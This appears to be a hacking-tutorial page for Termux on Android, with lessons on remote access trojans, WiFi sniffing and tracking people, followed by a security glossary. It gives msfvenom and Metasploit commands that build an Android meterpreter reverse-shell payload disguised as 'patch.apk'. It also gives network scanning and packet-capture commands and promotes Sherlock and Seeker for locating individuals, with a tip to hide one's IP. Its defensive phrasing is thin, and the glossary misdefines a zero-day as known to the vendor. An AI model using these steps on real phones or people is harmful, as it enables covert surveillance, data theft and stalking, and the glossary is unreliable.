01. Mobile Surveillance & RAT Analysis

Remote Access Trojans (RATs) are the most dangerous tools in a hacker's arsenal for mobile target acquisition. Using Termux, one can generate payloads that not only capture camera frames but also intercept SMS messages and call logs. This module explains the internal workings of 'Meterpreter' hooks and how they interact with the Android Kernel. You will learn how to identify hidden services that drain system resources and how to perform a manual forensic scan of your app's directory to find unauthorized '.so' files (shared libraries) that might be acting as a backdoor.

$ pkg install root-repo metasploit $ msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o patch.apk $ msfconsole -q > use multi/handler > set payload android/meterpreter/reverse_tcp

02. WiFi Signal Intelligence & Sniffing

Signal Intelligence (SIGINT) focuses on capturing data over the air. In this lesson, we cover the use of 'Airodump-ng' on Android via Termux (requires root/external adapter) to map every SSID in your vicinity. We discuss the 'Man-in-the-Middle' (MITM) attack flow where an attacker uses an 'Evil Twin' access point to capture unencrypted HTTP data. Understanding packet structure and the TCP/IP handshake is the first step in building a secure, encrypted network that is immune to deauthentication attacks.

$ pkg install nmap tshark tcpdump $ sudo nmap -sS -O 192.168.1.1/24 $ tcpdump -i wlan0 -vv -X

03. Advanced OSINT & People Tracking

Open Source Intelligence (OSINT) allows for the tracking of individuals using only public digital footprints. Tools like 'Sherlock' search hundreds of social media platforms simultaneously to find accounts associated with a single username. We also explore the use of 'Track-IP' and 'Seeker' which use HTML5 geolocation to find the exact coordinates of a person who clicks a link. Learn how to minimize your exposure by cleaning your digital footprint and using privacy-focused search engines.

$ git clone https://github.com/sherlock-project/sherlock.git $ python3 sherlock.py [username_to_track] # PRO TIP: Use a Tor bridge to hide your own IP while performing recon.

ğŸ“– CYBER ENCYCLOPEDIA (A-Z)

Advanced Persistent Threat (APT)A stealthy threat actor, typically a nation-state or state-sponsored group, which conducts long-term cyberattacks.
Brute Force AttackA trial-and-error method used by application programs to decode encrypted data such as passwords through exhaustive effort.
CryptojackingThe unauthorized use of someone else's computer to mine cryptocurrency.
Dark WebA part of the internet that isn't indexed by search engines and requires special software like Tor to access.
Exploit KitA software toolkit used to find and exploit vulnerabilities on computers to distribute malware.
FuzzingA technique used to find software bugs by providing invalid, unexpected, or random data as inputs to a computer program.
Google DorkingUsing advanced Google search techniques to find sensitive information that is not easily accessible.
Hash FunctionA mathematical algorithm that maps data of arbitrary size to a bit string of a fixed size.
Injection AttackA type of vulnerability that occurs when untrusted data is sent to an interpreter as part of a command or query.
John the RipperA fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS.
KeyloggerA type of surveillance software that has the capability to record every keystroke you make to a log file.
Logic BombA piece of code intentionally inserted into a software system that will set off a malicious function when specified conditions are met.
MalvertisingThe use of online advertising to spread malware. It typically involves injecting malicious advertisements into legitimate networks.
Nmap (Network Mapper)A free and open-source utility for network discovery and security auditing.
Onion RoutingA technique for anonymous communication over a computer network by wrapping messages in layers of encryption.
Penetration TestingAn authorized simulated cyberattack on a computer system, performed to evaluate the security of the system.
Quantum CryptographyThe science of exploiting quantum mechanical properties to perform cryptographic tasks.
Reverse EngineeringThe process of taking apart a finished product to see how it works in order to duplicate or enhance it.
SQL Injection (SQLi)A code injection technique used to attack data-driven applications, where malicious SQL statements are inserted into an entry field.
Trojan HorseA type of malware that is often disguised as legitimate software. Trojans can be used by cyber-thieves to gain access to systems.
UserlandThe area of a computer operating system where application software and some drivers execute.
Virtual Private Network (VPN)A service that creates a safe, encrypted connection over a less secure network, such as the public internet.
WormA standalone malware computer program that replicates itself in order to spread to other computers.
XSS (Cross-Site Scripting)A type of security vulnerability typically found in web applications that enables attackers to inject client-side scripts into web pages.
Zero-Day VulnerabilityA software security flaw that is known to the software vendor but for which no patch or fix has yet been released.
Zombie ComputerA computer connected to the internet that has been compromised by a hacker, computer virus or trojan horse.
